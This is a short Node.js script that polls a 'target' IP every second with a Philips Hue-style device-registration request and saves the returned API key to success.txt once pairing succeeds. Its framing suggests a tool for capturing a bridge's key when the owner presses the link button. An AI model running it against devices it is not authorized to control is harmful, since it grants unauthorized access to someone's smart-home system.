var request = require( 'request' );
var cron = require( 'node-cron' );
var fs = require( 'fs' );

var address = process.env.TARGET_ADDRESS;
var interval = '*/1 * * * * *';

if ( !address ){
	console.log( "No target IP specified, exiting..." );
	process.exit( 1 );
}else{
	console.log( `Target IP address: ${address}` );
}

var task;

task = cron.schedule( interval, ()=>{
	request.post({
		url:`http://${address}/api`,
		body: '{"devicetype":"my_hue_app#pc"}',
		timeout: 200
	},
		(err,resp,body)=>{
			if ( err ){
				if ( err.code == 'ETIMEDOUT' )
					console.log( "Error connecting to the target. Please check the target IP address." );
				else
					console.log( err );
			}
			else{
				try{
					var ob = JSON.parse( body )[0];
					if ( ob.success ){
						fs.appendFile( 'success.txt', body, err => {if ( err ) console.log(err)} );
						task.stop() // once we have an API key, stop running
					}
				}
				catch( e ){
					console.log( e )
				}
			}
		}
	);
});